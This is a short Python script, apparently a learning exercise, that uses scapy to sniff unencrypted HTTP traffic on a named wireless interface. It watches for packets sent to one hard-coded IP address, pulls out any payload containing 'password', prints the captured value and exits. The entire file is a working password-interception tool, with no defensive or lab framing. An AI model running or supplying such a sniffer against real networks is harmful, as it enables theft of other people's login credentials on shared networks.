from scapy.all import *
from scapy.layers.inet import IP, TCP


def pass_sniffer(pack):
    # Check if the destination IP address is '162.255.167.70'
    if pack[IP].dst == '162.255.167.70' and TCP in pack and Raw in pack:
        data = str(pack[Raw])
        # Check if the packet contains the keyword 'password'
        if 'password' in data:
            print(f'data of password packet:   {data} \n')
            # Split the data to extract the password value
            print(data.split('&')[1])
            # Exit the program after finding the password
            exit()


if __name__ == '__main__':
    # Sniff packets on port 80 (HTTP) on the specified network interface
    sniff(filter='tcp port 80', prn=pass_sniffer, iface='wlp0s20f3')
